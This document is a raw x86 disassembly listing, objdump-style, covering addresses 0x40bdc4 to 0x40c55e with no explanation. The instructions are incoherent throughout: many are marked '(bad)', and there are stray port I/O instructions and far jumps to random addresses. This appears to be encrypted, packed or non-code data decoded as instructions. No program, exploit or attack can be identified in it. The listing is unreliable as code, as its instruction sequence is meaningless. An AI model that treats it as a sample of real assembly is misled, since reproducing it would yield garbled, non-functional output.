  40bdc4:	mov    ds:0x9538e77b,al
  40bdc9:	es (bad) 
  40bdcb:	sti    
  40bdcc:	icebp  
  40bdcd:	dec    eax
  40bdce:	pop    ebx
  40bdcf:	sub    al,0xef
  40bdd1:	in     eax,dx
  40bdd2:	(bad)  
  40bdd3:	jmp    0x92ea27bb
  40bdd8:	retf   0x9df2
  40bddb:	cld    
  40bddc:	fcom   QWORD PTR [esi]
  40bdde:	loop   0x40bdcb
  40bde0:	icebp  
  40bde1:	inc    eax
  40bde2:	jbe    0x40be59
  40bde4:	and    eax,edi
  40bde6:	leave  
  40bde7:	fistp  QWORD PTR [eax+0x3a]
  40bdea:	dec    ecx
  40bdeb:	test   eax,0x2e9da103
  40bdf0:	jne    0x40be41
  40bdf2:	xlat   BYTE PTR ds:[ebx]
  40bdf3:	(bad)  
  40bdf4:	pop    esi
  40bdf5:	aad    0xc
  40bdf7:	(bad)  
  40bdf8:	xchg   edx,eax
  40bdf9:	jle    0x40bdd2
  40bdfb:	ds out dx,al
  40bdfd:	jb     0x40bdf0
  40bdff:	aad    0x20
  40be01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be02:	cmp    al,0x7b
  40be04:	cli    
  40be05:	lds    eax,FWORD PTR [esi+0x615a9aa3]
  40be0b:	inc    esp
  40be0c:	pop    ebp
  40be0d:	sahf   
  40be0e:	into   
  40be0f:	push   ebp
  40be10:	push   cs
  40be11:	pop    ecx
  40be12:	dec    edx
  40be13:	fldcw  WORD PTR ds:0x1ed6e0f1
  40be19:	mov    al,0x19
  40be1b:	adc    al,BYTE PTR [edx-0x9]
  40be1e:	mov    edx,0x9cfac8d1
  40be23:	idiv   BYTE PTR [eax+0x76e4d3aa]
  40be29:	popf   
  40be2a:	outs   dx,BYTE PTR ds:[esi]
  40be2b:	xor    DWORD PTR [eax+0x167d67a7],0xffffffc0
  40be32:	sbb    dh,ch
  40be34:	out    0xa3,al
  40be36:	dec    ecx
  40be37:	xchg   esi,eax
  40be38:	cmp    al,0x4b
  40be3a:	mov    edi,0xa4595db6
  40be3f:	ja     0x40bddb
  40be41:	in     eax,0xd0
  40be43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be44:	sub    al,BYTE PTR [edi-0x6]
  40be47:	pop    ss
  40be48:	cli    
  40be49:	mov    esp,DWORD PTR [ebp+0x14c17965]
  40be4f:	mov    ch,0x38
  40be51:	lahf   
  40be52:	stos   DWORD PTR es:[edi],eax
  40be53:	clc    
  40be54:	xor    esi,DWORD PTR [ecx]
  40be56:	loop   0x40bea0
  40be58:	xchg   esi,eax
  40be59:	call   0x26fab475
  40be5e:	ret    
  40be5f:	aas    
  40be60:	mov    ds,edx
  40be62:	pop    esp
  40be63:	int    0x6f
  40be65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be66:	or     ecx,ebp
  40be68:	(bad)  
  40be69:	loop   0x40be83
  40be6b:	and    dh,BYTE PTR [ebx-0x14]
  40be6e:	and    ebx,DWORD PTR [esi-0x4f]
  40be71:	leave  
  40be72:	fisub  WORD PTR [edx+0x7472c86f]
  40be78:	mov    eax,0x7c750747
  40be7d:	or     bh,BYTE PTR cs:[edi]
  40be80:	(bad)  
  40be81:	jmp    0x40be98
  40be83:	(bad)  
  40be84:	mov    ebx,DWORD PTR [esp+ecx*4+0x9]
  40be88:	adc    eax,0x3d6b225b
  40be8d:	dec    edx
  40be8e:	fisub  WORD PTR [edi+0x7d62a4c4]
  40be94:	fistp  DWORD PTR [edx]
  40be96:	shl    DWORD PTR [edx-0x123ab81],cl
  40be9c:	pusha  
  40be9d:	or     bl,BYTE PTR [esi-0x6b]
  40bea0:	dec    ebx
  40bea1:	adc    DWORD PTR [edx],edi
  40bea3:	mov    dl,0x7d
  40bea5:	sub    BYTE PTR [ecx+eax*8],bl
  40bea8:	adc    eax,0x8cfc15e0
  40bead:	add    al,BYTE PTR [ecx]
  40beaf:	cmp    eax,0x3f40d753
  40beb4:	cmp    edi,esi
  40beb6:	in     al,dx
  40beb7:	or     DWORD PTR [esi+0x32faef3c],ecx
  40bebd:	sub    BYTE PTR [edx],0x9c
  40bec0:	test   eax,0x384cbadd
  40bec5:	rol    esp,cl
  40bec7:	inc    ebx
  40bec8:	mov    DWORD PTR [ecx+ecx*1],edi
  40becb:	loopne 0x40bf10
  40becd:	and    al,0xb6
  40becf:	mov    al,0x52
  40bed1:	clc    
  40bed2:	mov    ?,WORD PTR [esi+0x7c084692]
  40bed8:	sbb    eax,0x9a730e2d
  40bedd:	rcr    BYTE PTR [ecx+edx*8-0x1d],cl
  40bee1:	sub    eax,0xb5a3d281
  40bee6:	push   ebp
  40bee7:	mov    ds:0x2eae2ca0,eax
  40beec:	inc    ecx
  40beed:	jge    0x40bf4a
  40beef:	push   ss
  40bef0:	sub    ecx,ebp
  40bef2:	jmp    0xf7857abf
  40bef7:	sub    bl,BYTE PTR [ecx]
  40bef9:	pop    eax
  40befa:	jmp    0x40bf1d
  40befc:	inc    esi
  40befd:	pop    es
  40befe:	or     bh,BYTE PTR [esi-0x27]
  40bf01:	call   0x92b8:0x3f83879d
  40bf08:	pop    ecx
  40bf09:	add    esp,ebp
  40bf0b:	mov    dh,0xe3
  40bf0d:	adc    al,0x2b
  40bf0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf10:	stc    
  40bf11:	ja     0x40bf03
  40bf13:	inc    esp
  40bf14:	jb     0x40bf07
  40bf16:	das    
  40bf17:	rol    DWORD PTR [ecx],1
  40bf19:	and    eax,0xfa97864c
  40bf1e:	shr    BYTE PTR [esi+0x4],0x64
  40bf22:	out    0xcf,eax
  40bf24:	xchg   ebx,eax
  40bf25:	cmc    
  40bf26:	push   ebp
  40bf27:	inc    ecx
  40bf28:	loop   0x40bec9
  40bf2a:	cmp    edi,DWORD PTR [esi]
  40bf2c:	cdq    
  40bf2d:	xor    DWORD PTR [ebp-0x5048c0e2],ecx
  40bf33:	jp     0x40bf7d
  40bf35:	mov    cl,0x83
  40bf37:	fimul  DWORD PTR ds:0x26241bb4
  40bf3d:	jne    0x40bf25
  40bf3f:	sbb    BYTE PTR [ecx+0x14bce871],cl
  40bf45:	aam    0xe0
  40bf47:	dec    edi
  40bf48:	outs   dx,DWORD PTR ds:[esi]
  40bf49:	mov    dl,0x54
  40bf4b:	adc    dh,al
  40bf4d:	iret   
  40bf4e:	(bad)  
  40bf4f:	(bad)  
  40bf51:	mov    eax,0x6ec7c6bb
  40bf56:	jne    0x40bfc9
  40bf58:	not    ah
  40bf5a:	fcom   QWORD PTR fs:[ecx+edi*4]
  40bf5e:	inc    eax
  40bf5f:	or     ebp,esi
  40bf61:	mov    WORD PTR [esi+edi*8-0x30],?
  40bf65:	cmp    eax,0xd5d7c7ab
  40bf6a:	mov    ah,0x5c
  40bf6c:	or     DWORD PTR [eax-0x435e49d],esp
  40bf72:	mov    al,BYTE PTR [ebx]
  40bf74:	push   esp
  40bf75:	test   ch,0xff
  40bf78:	int    0xb9
  40bf7a:	jmp    0x40bf54
  40bf7c:	sub    al,BYTE PTR [esi+eiz*8-0x2b9bf1fd]
  40bf83:	sub    DWORD PTR [ecx+0x30],esp
  40bf86:	cmp    DWORD PTR [ebx+esi*2],0x53
  40bf8a:	inc    edx
  40bf8b:	or     DWORD PTR [ebx],0x57
  40bf8e:	mov    ah,0xf8
  40bf90:	sub    DWORD PTR [ebx],ebp
  40bf92:	aad    0xbd
  40bf94:	test   BYTE PTR [eax-0x33],dl
  40bf97:	xchg   esp,eax
  40bf98:	jg     0x40bfe3
  40bf9a:	mov    gs,WORD PTR [ebp-0x6cd81f31]
  40bfa0:	call   0x7ae981ca
  40bfa5:	rcr    ch,1
  40bfa7:	adc    al,0x3
  40bfa9:	cli    
  40bfaa:	aas    
  40bfab:	aas    
  40bfac:	out    dx,al
  40bfad:	adc    ebp,DWORD PTR [eax-0x3e0683c1]
  40bfb3:	ret    
  40bfb4:	push   0x11aa1a2d
  40bfb9:	ja     0x40bf77
  40bfbb:	fwait
  40bfbc:	pop    edx
  40bfbd:	int3   
  40bfbe:	cmp    eax,0x6e7c26
  40bfc3:	dec    eax
  40bfc4:	repz sahf 
  40bfc6:	iret   
  40bfc7:	jg     0x40c048
  40bfc9:	pop    ebx
  40bfca:	and    esp,ecx
  40bfcc:	div    DWORD PTR [edx+ebx*1-0x4b]
  40bfd0:	call   0x563690f1
  40bfd5:	sbb    esp,DWORD PTR [esi]
  40bfd7:	push   0xffffffc3
  40bfd9:	std    
  40bfda:	mov    bh,0xb8
  40bfdc:	ror    DWORD PTR [ebp+0x3a],0x88
  40bfe0:	test   eax,0xca04ef3b
  40bfe5:	mov    esp,DWORD PTR [edx]
  40bfe7:	or     DWORD PTR [edx+0x3f],0xffffff91
  40bfeb:	lods   al,BYTE PTR ds:[esi]
  40bfec:	mov    ebp,0xc607e155
  40bff1:	mov    ds:0x3067338b,al
  40bff6:	jo     0x40c05d
  40bff8:	and    ch,BYTE PTR [edx]
  40bffa:	mov    al,ds:0x2c86c6e9
  40bfff:	xchg   ecx,eax
  40c000:	inc    esp
  40c001:	xchg   ebp,eax
  40c002:	pusha  
  40c003:	fsubp  st(6),st
  40c005:	pop    esp
  40c006:	pop    eax
  40c007:	xchg   ecx,eax
  40c008:	aas    
  40c009:	mov    eax,ds:0x37bf7e8b
  40c00e:	int    0xd9
  40c010:	shl    BYTE PTR [eax+0x553447f1],1
  40c016:	sub    eax,0x8a82d573
  40c01b:	fcomp  st(4)
  40c01d:	fiadd  WORD PTR [edx+0x65]
  40c020:	cmp    BYTE PTR [esi+ecx*4],bh
  40c023:	retf   
  40c024:	mov    al,ds:0x14e9ec94
  40c029:	push   ds
  40c02a:	or     ah,bh
  40c02c:	adc    eax,0x3d98d3f
  40c031:	push   0x7e
  40c033:	sbb    al,0x1c
  40c035:	cli    
  40c036:	and    DWORD PTR [ecx-0x7026293f],edx
  40c03c:	push   esp
  40c03d:	xor    eax,DWORD PTR ds:0xe4531107
  40c043:	push   cs
  40c044:	js     0x40c091
  40c046:	push   0xffffffc6
  40c048:	push   ecx
  40c049:	(bad)  
  40c04a:	and    BYTE PTR [ecx],ah
  40c04c:	xchg   esi,eax
  40c04d:	mov    edi,0x79968aad
  40c052:	icebp  
  40c053:	stos   BYTE PTR es:[edi],al
  40c054:	cmp    bl,cl
  40c056:	in     al,dx
  40c057:	adc    al,0x89
  40c059:	sub    al,0x87
  40c05b:	sub    cl,bl
  40c05d:	or     eax,0x12d3b3b8
  40c062:	xchg   ecx,eax
  40c063:	jae    0x40c02c
  40c065:	(bad)  
  40c066:	rcl    DWORD PTR [ecx],cl
  40c068:	popa   
  40c069:	out    dx,eax
  40c06a:	jge    0x40c082
  40c06c:	lock xor eax,0x59ff5e29
  40c072:	pop    edi
  40c073:	sub    DWORD PTR [ebx-0x42],ebx
  40c076:	pop    edx
  40c077:	inc    dl
  40c079:	add    eax,0xb0425337
  40c07e:	and    eax,0x8be73e68
  40c083:	rol    BYTE PTR [ebx],0x95
  40c086:	or     ch,BYTE PTR [esi]
  40c088:	mov    al,ds:0xee56035b
  40c08d:	lods   eax,DWORD PTR ds:[esi]
  40c08e:	out    0xa7,al
  40c090:	fwait
  40c091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c092:	test   eax,0xe75f286b
  40c097:	aaa    
  40c098:	or     BYTE PTR [ebp+0x7d288fbe],0x6f
  40c09f:	call   0xb9292cb9
  40c0a4:	cmp    al,BYTE PTR [ebx+0x696e4278]
  40c0aa:	push   0x76
  40c0ac:	ins    BYTE PTR es:[edi],dx
  40c0ad:	sub    eax,0xe7bc56b8
  40c0b2:	inc    edx
  40c0b3:	fdiv   st(7),st
  40c0b5:	in     al,dx
  40c0b6:	pusha  
  40c0b7:	cmp    al,0xbd
  40c0b9:	pop    ss
  40c0ba:	xor    dl,0x41
  40c0bd:	scas   eax,DWORD PTR es:[edi]
  40c0be:	popa   
  40c0bf:	es jmp 0x40c13f
  40c0c2:	inc    ebx
  40c0c3:	imul   edx,DWORD PTR [ebp+0x32789ef4],0x22
  40c0ca:	jno    0x40c0fb
  40c0cc:	push   ecx
  40c0cd:	daa    
  40c0ce:	test   DWORD PTR [ebx+0x55],0xefce0e41
  40c0d5:	pop    eax
  40c0d6:	clc    
  40c0d7:	pop    es
  40c0d8:	stc    
  40c0d9:	mov    cl,0x7e
  40c0db:	out    0x17,al
  40c0dd:	sub    edx,ebx
  40c0df:	mov    al,0x2f
  40c0e1:	aam    0x95
  40c0e3:	jae    0x40c145
  40c0e5:	inc    esp
  40c0e6:	mov    dl,0x17
  40c0e8:	data16 adc BYTE PTR [eax+0x1e],bh
  40c0ec:	(bad)  
  40c0ed:	adc    bh,cl
  40c0ef:	cmp    ch,BYTE PTR [esp+ebx*8-0x1f]
  40c0f3:	adc    BYTE PTR [edx-0x7fe9a4bf],al
  40c0f9:	daa    
  40c0fa:	lahf   
  40c0fb:	mov    ecx,0x966bfca5
  40c100:	aaa    
  40c101:	mov    BYTE PTR [edi+0xb],ah
  40c104:	psubb  mm7,QWORD PTR [ebx-0x14]
  40c108:	add    BYTE PTR [ebx+ebp*4+0x5f],ah
  40c10c:	xchg   ecx,eax
  40c10d:	les    edi,FWORD PTR [ebp-0x1645efcf]
  40c113:	out    dx,eax
  40c114:	pop    eax
  40c115:	out    dx,eax
  40c116:	adc    eax,0xc02a3c01
  40c11b:	or     eax,0x91627ae6
  40c120:	and    eax,0x61
  40c123:	ficom  WORD PTR [edx-0x5b]
  40c126:	icebp  
  40c127:	mov    eax,DWORD PTR [esi+ebx*8+0x1c5759ec]
  40c12e:	mov    cl,0x81
  40c130:	inc    ebp
  40c131:	sub    DWORD PTR [edi-0x30d30646],esp
  40c137:	shl    DWORD PTR [di+0x3f],1
  40c13b:	shr    BYTE PTR [eax+0x11],cl
  40c13e:	pop    edx
  40c13f:	inc    ebx
  40c140:	mov    bh,0x1f
  40c142:	aaa    
  40c143:	adc    cl,bh
  40c145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c146:	jmp    0xa9636499
  40c14b:	int    0x42
  40c14d:	aad    0xf5
  40c14f:	fidivr DWORD PTR [ecx-0x7f]
  40c152:	pushf  
  40c153:	jae    0x40c133
  40c155:	dec    edx
  40c156:	arpl   WORD PTR [ecx+0x67583847],di
  40c15c:	jl     0x40c184
  40c15e:	repz push edi
  40c160:	repnz adc edi,DWORD PTR [ecx+0x2eb3ec98]
  40c167:	ss in  eax,0x87
  40c16a:	(bad)  
  40c16b:	enter  0x959,0x96
  40c16f:	inc    edi
  40c170:	pop    eax
  40c171:	adc    esi,DWORD PTR [edx]
  40c173:	(bad)  
  40c175:	pushf  
  40c176:	leave  
  40c177:	popf   
  40c178:	(bad)  
  40c179:	aaa    
  40c17a:	(bad)  [eax-0x27a826a]
  40c180:	jno    0x40c18f
  40c182:	sub    DWORD PTR [edx+0x19],ebp
  40c185:	inc    esp
  40c186:	mov    eax,0xa51586d4
  40c18b:	loope  0x40c1b6
  40c18d:	pop    ebp
  40c18e:	pop    eax
  40c18f:	sbb    ecx,DWORD PTR ds:0xcadc46
  40c195:	inc    edx
  40c196:	fadd   QWORD PTR [edx+0x7f]
  40c199:	jbe    0x40c1b5
  40c19b:	dec    eax
  40c19c:	loopne 0x40c1d9
  40c19e:	xchg   ebp,eax
  40c19f:	sti    
  40c1a0:	mov    dl,0x5e
  40c1a2:	add    ah,BYTE PTR [ecx+0x4d]
  40c1a5:	or     eax,0x8b7684d4
  40c1aa:	jge    0x40c16a
  40c1ac:	adc    DWORD PTR [ebp+0x5a],ebp
  40c1af:	int3   
  40c1b0:	shl    BYTE PTR [ecx+0x832721f],cl
  40c1b6:	or     BYTE PTR [esi],bh
  40c1b8:	inc    edi
  40c1b9:	sub    al,0xac
  40c1bb:	xchg   ebp,eax
  40c1bc:	cmp    BYTE PTR [ebx-0x484b6db2],ch
  40c1c2:	jns    0x40c1eb
  40c1c4:	data16 out 0xbb,al
  40c1c7:	shr    ecx,0xcb
  40c1ca:	iret   
  40c1cb:	jns    0x40c163
  40c1cd:	dec    ebp
  40c1ce:	retf   0xd64d
  40c1d1:	add    BYTE PTR [edx+0x48147c90],ah
  40c1d7:	xchg   esi,eax
  40c1d8:	hlt    
  40c1d9:	shl    dl,1
  40c1db:	xor    eax,0xf552ac0
  40c1e0:	sbb    eax,0xde4dc4c4
  40c1e5:	mov    DWORD PTR [esi+0x9],eax
  40c1e8:	fild   DWORD PTR [edi]
  40c1ea:	sub    BYTE PTR [ebp-0x33],0x72
  40c1ee:	mov    bl,0xa7
  40c1f0:	ror    BYTE PTR [esp+edi*4-0x63c2afa5],1
  40c1f7:	or     DWORD PTR [edx+0x61],eax
  40c1fa:	fisubr DWORD PTR [edi+0x25]
  40c1fd:	xchg   BYTE PTR [eax+0x13],al
  40c200:	inc    edx
  40c201:	jle    0x40c211
  40c203:	jmp    0xd253e559
  40c208:	lahf   
  40c209:	push   esi
  40c20a:	mov    esp,0xa68517df
  40c20f:	repz fwait
  40c211:	and    bh,BYTE PTR [ecx]
  40c213:	mov    cl,0x6
  40c215:	jmp    0xd58c:0x88ed970
  40c21c:	into   
  40c21d:	fwait
  40c21e:	inc    eax
  40c21f:	sub    esp,eax
  40c221:	pop    ebp
  40c222:	dec    esp
  40c223:	inc    ebx
  40c224:	ret    
  40c225:	sub    dl,BYTE PTR [ebx]
  40c227:	sub    ecx,DWORD PTR [ebx]
  40c229:	ins    BYTE PTR es:[edi],dx
  40c22a:	push   esp
  40c22b:	int    0xf0
  40c22d:	sbb    ch,BYTE PTR [ebx-0x707eded7]
  40c233:	call   0x6186:0xcbcff1e0
  40c23a:	retf   
  40c23b:	retf   
  40c23c:	adc    cl,bh
  40c23e:	lods   eax,DWORD PTR ds:[esi]
  40c23f:	pusha  
  40c240:	jne    0x40c21a
  40c242:	adc    dh,bl
  40c244:	pop    ds
  40c245:	jecxz  0x40c218
  40c247:	stos   DWORD PTR es:[edi],eax
  40c248:	mov    ch,0x5e
  40c24a:	xchg   DWORD PTR [ebx+edi*2+0x539b5d81],eax
  40c251:	xor    DWORD PTR ds:0x2955b1f2,0x926779b2
  40c25b:	add    DWORD PTR [edi],esi
  40c25d:	inc    eax
  40c25e:	add    DWORD PTR [edi-0x6a],edi
  40c261:	retf   
  40c262:	inc    ebp
  40c263:	or     bh,cl
  40c265:	and    ah,ch
  40c267:	push   ebp
  40c268:	ret    
  40c269:	jae    0x40c234
  40c26b:	xchg   ebx,eax
  40c26c:	sub    al,0xa6
  40c26e:	push   ecx
  40c26f:	mov    esi,DWORD PTR [ecx+0x61]
  40c272:	hlt    
  40c273:	or     bh,dl
  40c275:	loope  0x40c22a
  40c277:	sub    DWORD PTR [ebp+0x49],0x977196b
  40c27e:	retf   0x7868
  40c281:	push   edx
  40c282:	dec    ebp
  40c283:	jns    0x40c24f
  40c285:	neg    BYTE PTR [edx-0x6c57b94f]
  40c28b:	or     ebx,esp
  40c28d:	aam    0x2e
  40c28f:	lock sbb BYTE PTR [eax-0x6d],cl
  40c293:	or     ecx,eax
  40c295:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c296:	cmp    edi,DWORD PTR [ebx]
  40c298:	sbb    DWORD PTR [edi+ecx*8-0x7f],ebx
  40c29c:	das    
  40c29d:	outs   dx,DWORD PTR ds:[esi]
  40c29e:	out    0xa2,al
  40c2a0:	add    dh,bl
  40c2a2:	stos   BYTE PTR es:[edi],al
  40c2a3:	cmp    eax,0x45aab2f2
  40c2a8:	or     eax,0x4c8be13c
  40c2ad:	pop    eax
  40c2ae:	scas   al,BYTE PTR es:[edi]
  40c2af:	nop
  40c2b0:	sub    BYTE PTR [esi-0xe],ch
  40c2b3:	call   DWORD PTR [esi-0x4c183671]
  40c2b9:	sub    BYTE PTR [edi+0x1f],dl
  40c2bc:	and    al,0xc
  40c2be:	in     al,0xa2
  40c2c0:	je     0x40c2c4
  40c2c2:	jmp    0x40c2c5
  40c2c4:	enter  0xc397,0xe5
  40c2c8:	out    dx,eax
  40c2c9:	xlat   BYTE PTR ds:[ebx]
  40c2ca:	imul   eax,edx,0xbeb43a88
  40c2d0:	popa   
  40c2d1:	sub    al,BYTE PTR [ebp-0x5ac4301b]
  40c2d7:	and    DWORD PTR [ebx],edx
  40c2d9:	jnp    0x40c2be
  40c2db:	push   ebp
  40c2dc:	mov    ds:0xf4bee7a4,eax
  40c2e1:	cli    
  40c2e2:	cmp    al,0x77
  40c2e4:	out    0xa7,al
  40c2e6:	mov    eax,0xbf223124
  40c2eb:	call   0x14f4:0x109572d8
  40c2f2:	jecxz  0x40c36e
  40c2f4:	mov    WORD PTR [edx+0x3d],es
  40c2f7:	xchg   ebp,eax
  40c2f8:	mov    al,0xa8
  40c2fa:	mov    bl,0x76
  40c2fc:	call   0x8b074094
  40c301:	aad    0xcc
  40c303:	xor    al,0x42
  40c305:	sub    eax,0x5e0a5ca2
  40c30a:	inc    eax
  40c30b:	aad    0x7f
  40c30d:	push   cs
  40c30e:	inc    ecx
  40c30f:	test   ch,dl
  40c311:	sar    DWORD PTR [esi-0xf],1
  40c314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c315:	(bad)  
  40c316:	pop    ebx
  40c317:	inc    ebp
  40c318:	loopne 0x40c2ef
  40c31a:	jmp    0x7d4d1007
  40c31f:	mov    esi,0xb3216d15
  40c324:	inc    ebp
  40c325:	or     BYTE PTR [edi+0x54c4ecf3],bl
  40c32b:	call   0xdb00:0x3f5dc385
  40c332:	into   
  40c333:	daa    
  40c334:	cs push 0xffffff87
  40c337:	rol    DWORD PTR [edx-0x68],0x2d
  40c33b:	sub    eax,0x3cbf9588
  40c340:	fs int3 
  40c342:	pop    eax
  40c343:	sub    al,0x5
  40c345:	sub    DWORD PTR [ecx+0x13],edi
  40c348:	imul   esp,DWORD PTR [esp+eax*8],0x48209be5
  40c34f:	push   edi
  40c350:	idiv   ecx
  40c352:	imul   edi,DWORD PTR [bx-0x54d6],0x43e91f7f
  40c35b:	inc    eax
  40c35c:	jae    0x40c353
  40c35e:	retf   
  40c35f:	mov    ah,0xa5
  40c361:	aas    
  40c362:	mov    al,0x75
  40c364:	scas   eax,DWORD PTR es:[edi]
  40c365:	mov    DWORD PTR [ebp+0xb159551],esi
  40c36b:	mov    ebx,esi
  40c36d:	or     al,0x30
  40c36f:	popa   
  40c370:	pop    esp
  40c371:	ja     0x40c3cf
  40c373:	ja     0x40c301
  40c375:	push   0x37f68853
  40c37a:	imul   esi,esp,0xfffffff2
  40c37d:	(bad)  
  40c37f:	push   eax
  40c380:	stos   BYTE PTR es:[edi],al
  40c381:	mov    edx,0xe666e4d3
  40c386:	jo     0x40c350
  40c388:	push   0xffffffd7
  40c38a:	ud0    esp,DWORD PTR ds:0x4bb6353
  40c391:	(bad)  [ecx+ecx*8-0x75]
  40c395:	ficom  DWORD PTR [ebx-0x53f2b702]
  40c39b:	test   eax,0xb9fd3203
  40c3a0:	xor    BYTE PTR [ecx-0x42],dl
  40c3a3:	sub    eax,0xe4aa4bfe
  40c3a8:	mov    ebx,0x63dc111
  40c3ad:	or     al,0xce
  40c3af:	fidivr WORD PTR [ebp+0x7ff2dabd]
  40c3b5:	cwde   
  40c3b6:	jmp    0x1f770d21
  40c3bb:	and    eax,0xdcac6650
  40c3c0:	loopne 0x40c35b
  40c3c2:	es and bh,dh
  40c3c5:	dec    ebx
  40c3c6:	sbb    bl,BYTE PTR cs:[edi]
  40c3c9:	or     eax,0x9e2b5913
  40c3ce:	xchg   ebx,eax
  40c3cf:	retf   
  40c3d0:	jns    0x40c3cf
  40c3d2:	adc    al,0x63
  40c3d4:	xor    al,0x85
  40c3d6:	cmc    
  40c3d7:	sti    
  40c3d8:	push   cs
  40c3d9:	(bad)  
  40c3da:	not    bh
  40c3dc:	out    dx,al
  40c3dd:	mov    cl,0xb9
  40c3df:	cmp    BYTE PTR [ebx],cl
  40c3e1:	push   edi
  40c3e2:	cs jmp 0x9a2ddee0
  40c3e8:	add    DWORD PTR [ecx],edi
  40c3ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c3eb:	inc    edx
  40c3ec:	retf   
  40c3ed:	out    0xbd,eax
  40c3ef:	int    0x9f
  40c3f1:	mov    ds:0xc4bb079c,al
  40c3f6:	jmp    0x393a1e6d
  40c3fb:	das    
  40c3fc:	stos   DWORD PTR es:[edi],eax
  40c3fd:	cmp    bh,BYTE PTR [ecx+0x27152b3c]
  40c403:	(bad)  
  40c404:	cmp    eax,0xf54a1dcc
  40c409:	sbb    ch,cl
  40c40b:	imul   ebp,DWORD PTR [esi+edi*4-0x64840978],0x9cbca4a9
  40c416:	mov    ebx,0xab438515
  40c41b:	stos   DWORD PTR es:[edi],eax
  40c41c:	add    edx,ecx
  40c41e:	sahf   
  40c41f:	scas   eax,DWORD PTR es:[edi]
  40c420:	push   edi
  40c421:	mov    edi,edx
  40c423:	pop    ebx
  40c424:	pop    ds
  40c425:	and    al,0xd4
  40c427:	or     eax,0xe92133c8
  40c42c:	addr16 push ebx
  40c42e:	cmp    DWORD PTR [ecx+0x329a973d],esp
  40c434:	fsubr  DWORD PTR [esi+0x56eb6148]
  40c43a:	lods   eax,DWORD PTR ds:[esi]
  40c43b:	mov    ch,0x7c
  40c43d:	loopne 0x40c4bb
  40c43f:	nop
  40c440:	fmul   QWORD PTR [ebp+0x3f63636f]
  40c446:	add    al,0x8b
  40c448:	mov    esi,0x3e05b8dd
  40c44d:	(bad)  
  40c44e:	sbb    BYTE PTR [edx+esi*2],ah
  40c451:	clc    
  40c452:	pop    es
  40c453:	mov    dh,dl
  40c455:	jns    0x40c492
  40c457:	pop    ss
  40c458:	retf   
  40c459:	arpl   ax,cx
  40c45b:	cmp    edi,DWORD PTR [ebp+0x715a5058]
  40c461:	call   FWORD PTR [ecx+0x4280bf63]
  40c467:	jo     0x40c497
  40c469:	outs   dx,DWORD PTR ds:[esi]
  40c46a:	jns    0x40c498
  40c46c:	lods   eax,DWORD PTR ds:[esi]
  40c46d:	push   ebx
  40c46e:	sbb    BYTE PTR [edx],ah
  40c470:	push   ecx
  40c471:	or     DWORD PTR [edi],0xffffffc0
  40c474:	mov    WORD PTR [ecx+esi*1],ss
  40c477:	mov    ah,BYTE PTR [ebp-0x6a37aca3]
  40c47d:	fnsave [ebx+0x43778375]
  40c483:	cdq    
  40c484:	shr    BYTE PTR ds:0x27c6e14d,0xfc
  40c48b:	pop    ebx
  40c48c:	and    al,0xbd
  40c48e:	sbb    DWORD PTR [esp+ebp*1-0x35],ebp
  40c492:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c493:	mov    WORD PTR [ebp+0xe0c39cf],ss
  40c499:	sub    al,0xc0
  40c49b:	push   eax
  40c49c:	pop    ebp
  40c49d:	loopne 0x40c4d8
  40c49f:	icebp  
  40c4a0:	ret    0xd18b
  40c4a3:	add    BYTE PTR [ebp-0x318c1f71],bh
  40c4a9:	mov    DWORD PTR [ebx+0x24],0x70520411
  40c4b0:	mov    ds:0xf79684ac,al
  40c4b5:	cdq    
  40c4b6:	adc    esi,DWORD PTR [ebp+0x2805072b]
  40c4bc:	push   0xffffff84
  40c4be:	xchg   BYTE PTR [esi+edi*1-0x31107675],bl
  40c4c5:	xchg   edi,eax
  40c4c6:	jnp    0x40c480
  40c4c8:	rcr    dh,cl
  40c4ca:	mov    ecx,0xcde3e46c
  40c4cf:	dec    edx
  40c4d0:	add    BYTE PTR [edi],0x76
  40c4d3:	jmp    0xd00c7a54
  40c4d8:	or     DWORD PTR [eax+edx*8-0x334f1080],esp
  40c4df:	mov    WORD PTR [edx],gs
  40c4e1:	shr    cl,1
  40c4e3:	mov    DWORD PTR [edx+0x36],ebp
  40c4e6:	and    ebp,DWORD PTR [ebp-0x42]
  40c4e9:	xchg   esi,eax
  40c4ea:	shl    BYTE PTR [ebp+0x69b0ac14],cl
  40c4f0:	ja     0x40c4ea
  40c4f2:	cmp    BYTE PTR [edi-0x1b],bl
  40c4f5:	mov    BYTE PTR [esp+eax*2],dl
  40c4f8:	inc    ebx
  40c4f9:	fdivr  QWORD PTR [esi]
  40c4fb:	cdq    
  40c4fc:	adc    DWORD PTR [eax+0x2c282618],esi
  40c502:	inc    esp
  40c503:	pop    eax
  40c504:	push   0x33
  40c506:	(bad)  
  40c507:	cmp    ch,bh
  40c509:	xchg   edx,eax
  40c50a:	add    eax,0xe7372255
  40c50f:	repnz clc 
  40c511:	xchg   ebp,eax
  40c512:	cdq    
  40c513:	shl    DWORD PTR [eax-0x18fe06ef],cl
  40c519:	leave  
  40c51a:	xchg   BYTE PTR [ebp-0x17],bl
  40c51d:	xchg   ebx,eax
  40c51e:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40c520:	or     al,0x61
  40c522:	fbstp  TBYTE PTR [ebp-0xadbaa3]
  40c528:	leave  
  40c529:	mov    cl,0x43
  40c52b:	cmp    DWORD PTR [edi+ebx*2+0x4727b0ce],esp
  40c532:	mov    ds:0x96fcfb7d,al
  40c537:	cmp    cl,BYTE PTR [esi]
  40c539:	inc    ebx
  40c53a:	mov    DWORD PTR [ebx+eax*1+0x2fe7c437],ebp
  40c541:	inc    edi
  40c542:	outs   dx,DWORD PTR ds:[esi]
  40c543:	mov    cl,0xb6
  40c545:	fs push 0x8eb0135
  40c54b:	adc    BYTE PTR [ebx+ebx*4-0x3f8246a3],dl
  40c552:	sbb    BYTE PTR [edi],dh
  40c554:	adc    al,BYTE PTR [esp+ebp*4-0x65770211]
  40c55b:	inc    ecx
  40c55c:	(bad)  
  40c55e:	and    eax,0x7b5f8ef0
